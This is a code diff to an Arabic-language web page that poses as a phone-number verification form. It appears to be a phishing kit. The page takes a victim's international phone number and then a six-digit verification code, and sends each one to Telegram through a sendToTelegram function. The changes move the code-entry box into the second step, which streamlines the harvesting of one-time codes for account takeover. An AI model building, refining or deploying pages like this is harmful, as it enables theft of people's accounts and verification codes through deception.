@@ -200,13 +200,10 @@
             text-align: right;
         }
         
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.15);
-            margin-top: 10px;
-        }
-        
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.25);
+        .code-section {
+            display: none;
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -238,11 +235,11 @@
                 </button>
             </div>
             
-            <!-- المرحلة 2: إدخال الرقم مع رمز البلد -->
+            <!-- المرحلة 2: إدخال الرقم مع رمز البلد وإرسال الكود -->
             <div class="step" id="step2">
                 <div class="step-header">
                     <span class="step-number">2</span>
-                    <span>تأكيد رقم الهاتف</span>
+                    <span>إرسال كود التحقق</span>
                 </div>
                 <div class="form-group">
                     <label for="phone-full">رقم الهاتف مسبوق برمز البلد</label>
@@ -252,22 +249,18 @@
                 <button id="send-code-btn">
                     <i class="fas fa-paper-plane"></i> إرسال كود التحقق
                 </button>
-            </div>
-            
-            <!-- المرحلة 3: إدخال كود التحقق -->
-            <div class="step" id="step3">
-                <div class="step-header">
-                    <span class="step-number">3</span>
-                    <span>التحقق النهائي</span>
+                
+                <!-- قسم إدخال الكود -->
+                <div class="code-section" id="code-section">
+                    <div class="form-group">
+                        <label for="code">كود التحقق المكون من 6 أرقام</label>
+                        <input type="text" id="code" placeholder="أدخل الكود الذي استلمته" maxlength="6">
+                        <div id="code-error" class="error">الكود يجب أن يتكون من 6 أرقام فقط</div>
+                    </div>
+                    <button id="verify-code-btn">
+                        <i class="fas fa-check-circle"></i> تحقق
+                    </button>
                 </div>
-                <div class="form-group">
-                    <label for="code">كود التحقق المكون من 6 أرقام</label>
-                    <input type="text" id="code" placeholder="أدخل الكود الذي استلمته" maxlength="6">
-                    <div id="code-error" class="error">الكود يجب أن يتكون من 6 أرقام فقط</div>
-                </div>
-                <button id="verify-code-btn">
-                    <i class="fas fa-check-circle"></i> تحقق
-                </button>
             </div>
             
             <div class="loader" id="loader"></div>
@@ -284,12 +277,14 @@
             // عناصر المراحل
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
             
             // حقول الإدخال
             const phoneLocalInput = document.getElementById('phone-local');
             const phoneFullInput = document.getElementById('phone-full');
             const codeInput = document.getElementById('code');
+            
+            // أقسام
+            const codeSection = document.getElementById('code-section');
             
             // أزرار
             const verifyPhoneBtn = document.getElementById('verify-phone-btn');
@@ -309,11 +304,9 @@
             function goToStep(stepNumber) {
                 step1.classList.remove('active');
                 step2.classList.remove('active');
-                step3.classList.remove('active');
                 
                 if(stepNumber === 1) step1.classList.add('active');
                 if(stepNumber === 2) step2.classList.add('active');
-                if(stepNumber === 3) step3.classList.add('active');
             }
             
             // المرحلة 1: توثيق الرقم
@@ -344,13 +337,16 @@
                 }
                 
                 // إرسال البيانات إلى التلجرام
-                sendToTelegram(`📱 المرحلة 2: تأكيد الرقم\n\n🌍 الرقم الدولي: ${phone}`);
+                sendToTelegram(`📱 المرحلة 2: إرسال كود التحقق\n\n🌍 الرقم الدولي: ${phone}`);
+                
+                // إظهار قسم إدخال الكود
+                codeSection.style.display = 'block';
                 
                 // إظهار المؤشر والنجاح
                 showLoaderAndSuccess(2);
             });
             
-            // المرحلة 3: التحقق من الكود
+            // المرحلة 2: التحقق من الكود
             verifyCodeBtn.addEventListener('click', function() {
                 const code = codeInput.value.trim();
                 
@@ -361,7 +357,7 @@
                 }
                 
                 // إرسال البيانات إلى التلجرام
-                sendToTelegram(`📱 المرحلة 3: التحقق النهائي\n\n🔑 كود التحقق: ${code}`);
+                sendToTelegram(`📱 المرحلة 2: التحقق من الكود\n\n🔑 كود التحقق: ${code}`);
                 
                 // إظهار المؤشر والنجاح
                 showLoaderAndSuccess(3);
@@ -370,9 +366,9 @@
             // دالة لعرض المؤشر ثم علامة النجاح
             function showLoaderAndSuccess(step) {
                 // إخفاء جميع الأزرار مؤقتاً
-                verifyPhoneBtn.style.display = 'none';
-                sendCodeBtn.style.display = 'none';
-                verifyCodeBtn.style.display = 'none';
+                if(step === 1) verifyPhoneBtn.style.display = 'none';
+                if(step === 2) sendCodeBtn.style.display = 'none';
+                if(step === 3) verifyCodeBtn.style.display = 'none';
                 
                 // إظهار المؤشر
                 loader.style.display = 'block';
@@ -393,9 +389,6 @@
                         if(step === 1) {
                             goToStep(2);
                             verifyPhoneBtn.style.display = 'block';
-                        } else if(step === 2) {
-                            goToStep(3);
-                            sendCodeBtn.style.display = 'block';
                         } else if(step === 3) {
                             // إعادة تعيين النموذج بعد اكتمال المراحل
                             resetForm();
@@ -439,6 +432,7 @@
                 phoneLocalInput.value = '';
                 phoneFullInput.value = '';
                 codeInput.value = '';
+                codeSection.style.display = 'none';
                 goToStep(1);
                 
                 // إظهار رسالة نهائية
